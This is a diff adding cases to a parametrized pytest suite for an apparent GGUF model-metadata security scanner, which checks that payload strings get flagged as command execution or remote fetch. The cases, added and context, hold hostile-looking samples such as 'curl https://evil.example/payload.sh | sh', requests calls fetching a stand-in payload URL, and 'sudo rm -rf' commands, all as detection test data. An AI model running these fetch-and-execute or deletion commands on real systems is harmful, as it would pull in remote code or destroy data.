@@ -1140,6 +1140,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("command", "rm /tmp/model-cache -rf", "command_execution"),
         ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
         ("command", "sudo rm /tmp/model-cache -r -f", "command_execution"),
+        ("command", "sudo -u nobody rm -rf /tmp/model-cache", "command_execution"),
         ("command", "timeout 5 rm -rf /tmp/model-cache", "command_execution"),
         ("loader", "eval('1 + 1')", "command_execution"),
         ("loader", "subprocess.run(['id'])", "command_execution"),
@@ -1171,6 +1172,8 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("callback", "httpx.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'httpx.request("GET", url="https://evil.example/payload")', "remote_fetch"),
         ("callback", "requests.get(headers=dict(), url='https://evil.example/payload')", "remote_fetch"),
+        ("callback", "from requests import get; get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "from requests import get as rg; rg('https://evil.example/payload')", "remote_fetch"),
         ("callback", "import requests as r; r.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", "import httpx as hx; hx.stream('GET', 'https://evil.example/payload')", "remote_fetch"),
         ("callback", "urllib.request.urlretrieve('https://evil.example/payload', '/tmp/payload')", "remote_fetch"),
@@ -1181,6 +1184,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("general.description", "example: curl https://evil.example/payload.sh", "remote_fetch"),
         ("general.description", "Example:\n```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
         ("general.description", "# Model\nDocumentation:\ncurl https://evil.example/payload.sh | sh", "remote_fetch"),
+        ("general.description", "# Model\n## Usage\n> docs\nrm -rf /tmp/model-cache", "command_execution"),
     ],
 )
 def test_gguf_metadata_value_requires_concrete_security_evidence(
